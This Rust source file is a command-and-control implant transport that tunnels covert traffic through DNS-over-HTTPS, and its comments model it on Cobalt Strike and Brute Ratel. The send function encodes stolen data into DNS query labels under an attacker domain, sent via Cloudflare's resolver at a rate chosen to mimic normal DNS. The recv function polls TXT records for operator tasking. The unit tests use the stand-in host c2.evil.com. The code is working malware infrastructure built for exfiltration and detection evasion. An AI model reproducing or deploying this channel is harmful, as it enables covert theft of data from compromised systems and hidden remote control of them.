//! DoH DNS Tunneling C2 transport — DNS-over-HTTPS covert channel.
//!
//! CS 4.13 + BRC4 v2.5 use DNS for restricted egress environments: the implant
//! encodes C2 frames in DNS query names and the server returns responses in TXT
//! record answers. By wrapping DNS in TLS 1.3 HTTPS (RFC 8484 DoH), the traffic
//! blends with legitimate encrypted DNS resolution — Cloudflare, Google, Quad9
//! all serve DoH endpoints that millions of endpoints query continuously.
//!
//! ## Send (uplink / exfil)
//! - URL-safe base64-encode the frame payload (RFC 4648 §5, alphabet `A-Za-z0-9-_`, no padding — all chars are DNS-label-safe; standard base64's `+`, `/`, `=` are invalid in DNS labels).
//! - Split into 160-byte raw chunks (fits base64-expanded within the 253-char
//!   DNS name limit when split across 63-char labels).
//! - For each chunk: POST to the DoH JSON API with a TXT query whose name
//!   encodes the chunk: `c{N}.{b64_label_1}.{b64_label_2}...{domain}`.
//! - Rate limit: 1 query/s (mimics normal DNS cadence).
//!
//! ## Recv (downlink / infil)
//! - Poll the DoH endpoint for TXT records at `task.{domain}`.
//! - The C2 team server's authoritative DNS responds with base64-encoded
//!   payload in the TXT RDATA.
//! - Reassemble multi-chunk responses by chunk prefix.
//!
//! ## Health check
//! - Query `health.{domain}` A record via DoH — measure round-trip time.

use std::thread;
use std::time::{Duration, Instant};

use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;
use base64::Engine;
use serde_json::Value;
use ureq::Agent;

use crate::traits::{Transport, TransportError};

// ---- Constants -------------------------------------------------------------

/// Maximum bytes of raw data per DNS query chunk.  160 raw bytes → ~216 base64
/// chars → split into ≤4 labels of ≤63 chars → total DNS name ≤253 chars
/// with typical C2 domains (≤25 chars).  Longer domains need smaller chunks.
const CHUNK_SIZE: usize = 160;

/// DNS label maximum length (RFC 1035 §2.3.4).
const MAX_LABEL_LEN: usize = 63;

/// Maximum total DNS name length in bytes (RFC 1035 §2.3.4: 255 octets on the
/// wire, of which the trailing root label/length encoding leaves 253 usable).
/// A query name over this is rejected by resolvers as FORM_ERR; without this
/// guard a long C2 domain + a high `send_seq` (longer `c{N}-{i}` prefix) would
/// overflow silently, the query would never resolve, and the channel would die
/// with no diagnostic.
const MAX_DNS_NAME_LEN: usize = 253;

/// Rate limit between successive DNS queries — 1 query/s to mimic normal DNS.
const QUERY_INTERVAL_MS: u64 = 1_000;

/// Default DoH endpoint (Cloudflare — high availability, low latency).
const DEFAULT_DOH_SERVER: &str = "https://cloudflare-dns.com/dns-query";

/// DNS record type constants.
const DNS_TYPE_TXT: u16 = 16;
const DNS_TYPE_A: u16 = 1;

/// DoH JSON content type.
const DOH_CONTENT_TYPE: &str = "application/dns-json";

// ---- DohDnsTransport -------------------------------------------------------

/// Covert C2 channel tunnelled through DNS-over-HTTPS.
///
/// Each outbound frame is base64-encoded, chunked into DNS-label-safe pieces,
/// and sent as a series of TXT-record DoH queries. Inbound frames are polled
/// from TXT records served by the C2 team server's authoritative DNS.
pub struct DohDnsTransport {
    /// DoH resolver endpoint (e.g. `https://cloudflare-dns.com/dns-query`).
    doh_server: String,
    /// C2-controlled domain (e.g. `c2.evil.com`).
    domain: String,
    /// HTTP agent with connection keep-alive.
    agent: Agent,
    /// Time of last outbound query — used for rate limiting.
    last_send: Option<Instant>,
    /// Sequence counter for outbound chunk ordering.
    send_seq: u64,
    /// Sequence counter for inbound chunk ordering.
    recv_seq: u64,
}

impl DohDnsTransport {
    /// Create a new DoH DNS transport channel.
    ///
    /// `domain` is the C2-controlled domain name. `doh_server` is the DoH
    /// resolver endpoint; pass `None` to use Cloudflare's default.
    pub fn new(domain: impl Into<String>, doh_server: Option<&str>) -> Self {
        DohDnsTransport {
            doh_server: doh_server
                .map(|s| s.to_string())
                .unwrap_or_else(|| DEFAULT_DOH_SERVER.to_string()),
            domain: domain.into(),
            agent: Agent::new(),
            last_send: None,
            send_seq: 0,
            recv_seq: 0,
        }
    }

    // ---- Internal helpers --------------------------------------------------

    /// Enforce the 1 QPS rate limit between outbound queries.
    fn enforce_rate_limit(&self) {
        if let Some(last) = self.last_send {
            let elapsed = last.elapsed();
            if elapsed < Duration::from_millis(QUERY_INTERVAL_MS) {
                let remaining = Duration::from_millis(QUERY_INTERVAL_MS) - elapsed;
                thread::sleep(remaining);
            }
        }
    }

    /// Build a DNS query name that encodes `data` (base64 text) as subdomain
    /// labels under `prefix.{domain}`.  Labels are capped at [`MAX_LABEL_LEN`].
    ///
    /// Returns `Err` if the fully-assembled name exceeds [`MAX_DNS_NAME_LEN`]
    /// bytes — a name that long is rejected by resolvers as FORM_ERR, so sending
    /// it would silently kill the channel (the query never resolves, no error
    /// surfaces). The overflow happens when the C2 domain is long and/or
    /// `send_seq`/`i` grow the `c{N}-{i}` prefix past what the domain leaves
    /// room for; this guard turns that silent failure into a transport error the
    /// caller can react to (and that gets logged).
    fn build_query_name(&self, prefix: &str, b64_data: &str) -> Result<String, TransportError> {
        let mut labels: Vec<&str> = Vec::new();
        let mut remaining = b64_data;

        while !remaining.is_empty() {
            let split = if remaining.len() <= MAX_LABEL_LEN {
                remaining.len()
            } else {
                // Split at a clean boundary (prefer label-length chunks).
                MAX_LABEL_LEN
            };
            labels.push(&remaining[..split]);
            remaining = &remaining[split..];
        }

        let qname = format!("{}.{}.{}", prefix, labels.join("."), self.domain);
        if qname.len() > MAX_DNS_NAME_LEN {
            return Err(TransportError::Transient(
                "DoH query name exceeds 253-byte DNS limit (domain too long for chunk size)",
            ));
        }
        Ok(qname)
    }

    /// POST a DoH JSON query and return the parsed response body.
    ///
    /// `qname` is the fully-qualified DNS name to query.  `qtype` is the
    /// record type (e.g. `DNS_TYPE_TXT` for TXT).
    fn doh_query(&self, qname: &str, qtype: u16) -> Result<Value, TransportError> {
        let body = serde_json::json!({
            "name": qname,
            "type": qtype,
        });

        let response = self
            .agent
            .post(&self.doh_server)
            .set("Content-Type", DOH_CONTENT_TYPE)
            .set("Accept", DOH_CONTENT_TYPE)
            .send_json(body)
            .map_err(|e| match &e {
                ureq::Error::Transport(_) => TransportError::Transient("DoH transport error"),
                ureq::Error::Status(code, _resp) => {
                    if *code >= 500 {
                        TransportError::Transient("DoH server error")
                    } else {
                        TransportError::Transient("DoH client error")
                    }
                }
            })?;

        response
            .into_json::<Value>()
            .map_err(|_| TransportError::Transient("invalid DoH JSON response"))
    }

    /// Extract TXT record data (the `data` field) from a DoH JSON response.
    ///
    /// The DoH JSON response has shape:
    /// ```json
    /// { "Status": 0, "Answer": [ { "name": "...", "type": 16, "data": "..." } ] }
    /// ```
    /// Returns `None` when no TXT answers are present (NXDOMAIN or empty
    /// answer section).
    fn extract_txt_data(json: &Value) -> Option<String> {
        let answer = json.get("Answer")?.as_array()?;
        for rr in answer {
            if rr.get("type")?.as_u64()? == DNS_TYPE_TXT as u64 {
                // TXT RDATA in DoH JSON is a quoted string; strip surrounding
                // quotes if present.
                let raw = rr.get("data")?.as_str()?;
                let data = raw.trim_matches('"');
                return Some(data.to_string());
            }
        }
        None
    }
}

// ---- Transport impl --------------------------------------------------------

impl Transport for DohDnsTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > self.max_frame_size() {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        // 1. Split frame into raw-byte chunks (each fits within DNS name limits
        //    when base64-encoded and label-split).
        let raw_chunks: Vec<&[u8]> = frame.chunks(CHUNK_SIZE).collect();

        // 2. For each raw chunk, base64-encode and send as a DNS query.

        for (i, chunk) in raw_chunks.iter().enumerate() {
            self.enforce_rate_limit();

            let chunk_b64 = BASE64.encode(chunk);
            let prefix = format!("c{}-{}", self.send_seq, i);
            // `?` propagates the 253-byte overflow guard: a name too long for
            // the configured domain would FORM_ERR at the resolver and silently
            // kill the channel.
            let qname = self.build_query_name(&prefix, &chunk_b64)?;

            // POST the DoH TXT query. The DNS response is irrelevant for
            // exfiltration — the query itself carries the data to the C2
            // server's authoritative DNS.
            self.doh_query(&qname, DNS_TYPE_TXT)?;

            // Rate limit between chunks.
            if i + 1 < raw_chunks.len() {
                thread::sleep(Duration::from_millis(QUERY_INTERVAL_MS));
            }

            self.last_send = Some(Instant::now());
        }

        self.send_seq = self.send_seq.wrapping_add(1);
        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        let deadline = Instant::now() + Duration::from_millis(timeout_ms as u64);

        // Poll for TXT records at `task.{domain}` within the timeout window.
        loop {
            let qname = format!("task.{}", self.domain);
            let json = match self.doh_query(&qname, DNS_TYPE_TXT) {
                Ok(v) => v,
                Err(TransportError::Transient(_)) => {
                    // Transient failure — retry if time remains.
                    if Instant::now() >= deadline {
                        return Err(TransportError::Timeout);
                    }
                    thread::sleep(Duration::from_millis(500));
                    continue;
                }
                Err(e) => return Err(e),
            };

            // Check if the response contains TXT data.
            match Self::extract_txt_data(&json) {
                Some(txt_data) => {
                    // Try to base64-decode the TXT RDATA.
                    match BASE64.decode(&txt_data) {
                        Ok(frame) => {
                            self.recv_seq = self.recv_seq.wrapping_add(1);
                            return Ok(frame);
                        }
                        Err(_) => {
                            // TXT record exists but isn't valid base64 —
                            // treat as "no data yet" and keep polling.
                        }
                    }
                }
                None => {
                    // No answer — keep polling if time remains.
                }
            }

            if Instant::now() >= deadline {
                return Err(TransportError::Timeout);
            }

            // Poll at ~2 Hz to avoid hammering the resolver.
            thread::sleep(Duration::from_millis(500));
        }
    }

    fn health_check(&self) -> Option<u64> {
        let qname = format!("health.{}", self.domain);
        let start = Instant::now();

        // Query an A record — faster than TXT, and the resolver still has
        // to reach the authoritative DNS (proving the path is live).
        match self.doh_query(&qname, DNS_TYPE_A) {
            Ok(_) => Some(start.elapsed().as_millis() as u64),
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "doh-dns"
    }

    fn max_frame_size(&self) -> usize {
        // DNS is low-bandwidth — keep frames ≤10 KB to limit exfiltration
        // time (~63 queries at 1 QPS = ~63 s per frame).
        10 * 1024
    }

    fn init(&mut self) -> Result<(), TransportError> {
        // Verify the DoH endpoint is reachable and responds with valid JSON.
        self.health_check()
            .map(|_| ())
            .ok_or(TransportError::Dead("DoH endpoint unreachable"))
    }
}

// ---- Tests -----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_query_name_splits_into_labels() {
        let t = DohDnsTransport::new("c2.evil.com", None);
        let b64 = "A".repeat(200); // 200 chars → 4 labels (63+63+63+11)
        let qname = t
            .build_query_name("c0-0", &b64)
            .expect("short domain must fit the 253-byte limit");
        assert!(qname.ends_with(".c2.evil.com"));
        assert!(qname.starts_with("c0-0."));
        // Each label must be ≤63 chars.
        let labels: Vec<&str> = qname.split('.').collect();
        for label in &labels[1..labels.len() - 3] {
            // labels[0] = "c0-0", labels[1..n-3] = b64 labels, labels[n-3..] = domain
            assert!(label.len() <= 63, "label '{}' exceeds 63 chars", label);
        }
    }

    #[test]
    fn build_query_name_fits_dns_limit() {
        let t = DohDnsTransport::new("c2.evil.com", None);
        // 160 bytes → ~216 base64 chars.
        let data = vec![0xAAu8; 160];
        let b64 = BASE64.encode(&data);
        let qname = t
            .build_query_name("c0-0", &b64)
            .expect("c2.evil.com + CHUNK_SIZE must fit the 253-byte limit");
        // DNS total name must be ≤253 chars.
        assert!(
            qname.len() <= 253,
            "query name length {} exceeds 253",
            qname.len()
        );
    }

    #[test]
    fn chunk_size_produces_valid_name() {
        // With a typical C2 domain (≤25 chars), a CHUNK_SIZE byte payload
        // always fits within the 253-char DNS name limit after base64+label
        // encoding.  Longer domains need smaller chunks.
        let t = DohDnsTransport::new("fairly.long.c2.test.com", None);
        let data = vec![0xFFu8; CHUNK_SIZE];
        let b64 = BASE64.encode(&data);
        let qname = t
            .build_query_name("c99-99", &b64)
            .expect("fairly.long.c2.test.com + CHUNK_SIZE must fit the 253-byte limit");
        assert!(
            qname.len() <= 253,
            "query name length {} exceeds 253; domain may be too long for CHUNK_SIZE",
            qname.len()
        );
    }

    #[test]
    fn build_query_name_rejects_over_253_bytes() {
        // The 253-byte guard: a very long C2 domain + a full CHUNK_SIZE payload
        // overflows the DNS name. Previously this built an over-long name that
        // the resolver rejected as FORM_ERR, silently killing the channel; now
        // it's a clean transport error so the caller can react (and log it).
        let long_domain = "a".repeat(200) + ".evil.com";
        let t = DohDnsTransport::new(long_domain, None);
        let data = vec![0xAAu8; CHUNK_SIZE];
        let b64 = BASE64.encode(&data);
        let err = t
            .build_query_name("c0-0", &b64)
            .expect_err("a >200-char domain + CHUNK_SIZE must overflow the 253-byte limit");
        assert!(
            matches!(err, TransportError::Transient(_)),
            "expected a Transient error for an over-length name, got {err:?}"
        );
    }

    #[test]
    fn name_returns_expected() {
        let t = DohDnsTransport::new("c2.evil.com", None);
        assert_eq!(t.name(), "doh-dns");
    }

    #[test]
    fn max_frame_size_is_10k() {
        let t = DohDnsTransport::new("c2.evil.com", None);
        assert_eq!(t.max_frame_size(), 10 * 1024);
    }

    #[test]
    fn send_rejects_oversized_frame() {
        let mut t = DohDnsTransport::new("c2.evil.com", None);
        let big = vec![0u8; 11 * 1024];
        let result = t.send(&big);
        assert!(matches!(result, Err(TransportError::PayloadTooLarge(_))));
    }

    #[test]
    fn extract_txt_data_from_valid_json() {
        let json = serde_json::json!({
            "Status": 0,
            "Answer": [
                { "name": "task.c2.evil.com.", "type": 16, "TTL": 300, "data": "\"SGVsbG8=\"" }
            ]
        });
        let data = DohDnsTransport::extract_txt_data(&json);
        assert_eq!(data, Some("SGVsbG8=".to_string()));
    }

    #[test]
    fn extract_txt_data_no_answer_returns_none() {
        let json = serde_json::json!({
            "Status": 3,  // NXDOMAIN
            "Answer": null
        });
        assert!(DohDnsTransport::extract_txt_data(&json).is_none());
    }

    #[test]
    fn extract_txt_data_wrong_type_returns_none() {
        let json = serde_json::json!({
            "Status": 0,
            "Answer": [
                { "name": "task.c2.evil.com.", "type": 1, "TTL": 300, "data": "1.2.3.4" }
            ]
        });
        assert!(DohDnsTransport::extract_txt_data(&json).is_none());
    }

    #[test]
    fn doh_query_builds_valid_json_body() {
        let t = DohDnsTransport::new("c2.evil.com", None);
        // We can't actually hit the network in unit tests, but we can verify
        // the query name construction is valid.
        let qname = t
            .build_query_name("c0-0", "dGVzdA")
            .expect("short payload + short domain must fit the 253-byte limit");
        assert!(qname.contains("c0-0"));
        assert!(qname.ends_with("c2.evil.com"));
    }

    #[test]
    fn url_safe_base64_emits_only_dns_label_chars() {
        // P1-12: every byte value 0x00..=0xFF must encode to chars that are
        // legal inside a DNS label (alnum, '-', '_'). Standard base64 would
        // emit '+', '/', and '=' for high/random bytes — invalid in DNS labels
        // and silently truncated by resolvers, breaking real encrypted frames.
        let all_bytes: Vec<u8> = (0u8..=255).collect();
        let enc = BASE64.encode(&all_bytes);
        assert!(!enc.contains('='), "padding '=' must not appear: {enc}");
        assert!(!enc.contains('+'), "'+' must not appear: {enc}");
        assert!(!enc.contains('/'), "'/' must not appear: {enc}");
        for c in enc.chars() {
            assert!(
                c.is_ascii_alphanumeric() || c == '-' || c == '_',
                "non-DNS-label char '{c}' in encoded output: {enc}"
            );
        }
        // Round-trip: decode must recover the original bytes.
        let dec = BASE64.decode(&enc).expect("decode must round-trip");
        assert_eq!(dec, all_bytes);
    }

    #[test]
    fn build_query_name_all_dns_label_safe() {
        // High-entropy payload (simulates an encrypted frame) must produce a
        // query name whose every label is DNS-safe after encoding + splitting.
        let t = DohDnsTransport::new("c2.evil.com", None);
        let data = vec![0xFFu8; CHUNK_SIZE];
        let b64 = BASE64.encode(&data);
        let qname = t
            .build_query_name("c0-0", &b64)
            .expect("short domain + CHUNK_SIZE must fit the 253-byte limit");
        for label in qname.split('.') {
            for c in label.chars() {
                // prefix label may contain '-'; everything else is b64.
                assert!(
                    c.is_ascii_alphanumeric() || c == '-' || c == '_',
                    "label '{label}' has non-DNS-safe char '{c}' in qname {qname}"
                );
            }
        }
    }
}
